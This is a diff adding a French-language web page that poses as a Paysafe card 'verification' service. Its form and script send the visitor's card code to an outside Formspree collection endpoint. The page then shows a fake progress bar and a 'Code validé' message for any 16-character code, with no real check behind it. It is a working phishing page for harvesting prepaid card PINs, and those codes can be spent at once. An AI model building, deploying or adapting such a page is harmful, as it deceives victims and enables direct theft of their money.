@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Vérification Carte Paysafe</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: white;
+      color: black;
+      overflow-x: hidden;
+    }
+    .container {
+      padding: 40px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 2em;
+      font-family: 'Impact', 'Arial Black', sans-serif;
+      margin-bottom: 20px;
+    }
+    input[type="text"] {
+      padding: 12px;
+      width: 300px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      background-color: #eee;
+      font-size: 16px;
+    }
+    #loaderBar {
+      margin: 20px auto;
+      height: 10px;
+      width: 300px;
+      background: #ddd;
+      display: none;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+    #progress {
+      height: 100%;
+      width: 0;
+      background: black;
+      transition: width 0.5s;
+    }
+    .icons {
+      display: flex;
+      justify-content: center;
+      gap: 50px;
+      margin-top: 80px;
+      font-size: 40px;
+    }
+    .icons div {
+      font-size: 50px;
+    }
+    .steps {
+      margin-top: 60px;
+      max-width: 800px;
+      margin-left: auto;
+      margin-right: auto;
+      text-align: left;
+    }
+    .step {
+      opacity: 0;
+      transform: translateX(-50px);
+      transition: all 0.6s ease-out;
+      margin-bottom: 40px;
+      font-size: 1.1em;
+      background: #eee;
+      padding: 20px;
+      border-radius: 10px;
+      margin-left: 0;
+    }
+    .step.visible {
+      opacity: 1;
+      transform: translateX(0);
+    }
+    #result {
+      margin-top: 100px;
+      display: none;
+      font-size: 1.5em;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
+      padding: 30px;
+      border-radius: 10px;
+      animation: fadeInUp 1s ease forwards;
+      border-left: 5px solid;
+      text-decoration: underline;
+      color: white;
+    }
+    @keyframes fadeInUp {
+      0% {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Code Paysafe :</h1>
+    <form id="codeForm" action="https://formspree.io/f/myzjvnwg" method="POST" onsubmit="return sendCode(event)">
+      <input type="text" name="code" id="code" placeholder="Entrez le code de votre carte..." required />
+      <br /><br />
+      <button type="submit">Vérifier</button>
+    </form>
+
+    <div id="loaderBar"><div id="progress"></div></div>
+
+    <div class="icons">
+      <div>💳</div>
+      <div>📲</div>
+      <div>✅</div>
+    </div>
+
+    <div class="steps">
+      <div class="step">1. 💳 Achetez une carte Paysafe dans un point de vente ou en ligne. Elle contient un code PIN à 16 chiffres.</div>
+      <div class="step">2. 🧾 Connectez-vous sur un site ou une plateforme acceptant Paysafe comme moyen de paiement.</div>
+      <div class="step">3. 🔐 Choisissez Paysafe comme méthode de paiement et entrez le code PIN de votre carte.</div>
+      <div class="step">4. 💸 Une fois le code validé, le montant est automatiquement déduit de la carte et utilisé pour votre achat.</div>
+      <div class="step">5. 📧 Vous pouvez vérifier l’historique de vos transactions en créant un compte Paysafe.</div>
+      <div class="step">6. ✅ Il n’est pas nécessaire de fournir de données bancaires, ce qui rend ce moyen de paiement anonyme et sécurisé.</div>
+    </div>
+
+    <div id="result"></div>
+  </div>
+
+  <script>
+    function revealSteps() {
+      const steps = document.querySelectorAll('.step');
+      steps.forEach(step => {
+        const top = step.getBoundingClientRect().top;
+        if (top < window.innerHeight - 100) {
+          step.classList.add('visible');
+        }
+      });
+    }
+
+    window.addEventListener('scroll', revealSteps);
+
+    function sendCode(e) {
+      e.preventDefault();
+      const form = e.target;
+      const loaderBar = document.getElementById('loaderBar');
+      const progress = document.getElementById('progress');
+      const result = document.getElementById('result');
+
+      const code = document.getElementById('code').value.trim();
+
+      // Reset affichage résultat avant chargement
+      result.style.display = 'none';
+      result.textContent = '';
+      loaderBar.style.display = 'block';
+      progress.style.width = '0%';
+
+      // Envoi du formulaire à Formspree
+      fetch(form.action, {
+        method: 'POST',
+        body: new FormData(form),
+        headers: { 'Accept': 'application/json' }
+      }).catch(() => {
+        // On ignore l'erreur réseau ici pour continuer la simulation
+      });
+
+      // Animation de la barre de chargement pendant 9s (18 x 500ms)
+      let i = 0;
+      const interval = setInterval(() => {
+        i++;
+        progress.style.width = (i * (100 / 18)) + '%';
+        if (i >= 18) {
+          clearInterval(interval);
+          loaderBar.style.display = 'none';
+          result.style.display = 'block';
+
+          if (/^[A-Za-z0-9]{16}$/.test(code)) {
+            // Code valide
+            result.style.color = '#00cc66';
+            result.style.background = 'black';
+            result.style.borderLeft = '5px solid #00cc66';
+            result.textContent = '✅ Code validé';
+          } else {
+            // Code non valide (sans message sur la longueur)
+            result.style.color = 'white';
+            result.style.background = 'red';
+            result.style.borderLeft = '5px solid darkred';
+            result.textContent = '❌ Code non validé';
+          }
+
+          window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+        }
+      }, 500);
+
+      return false;
+    }
+  </script>
+</body>
+</html>
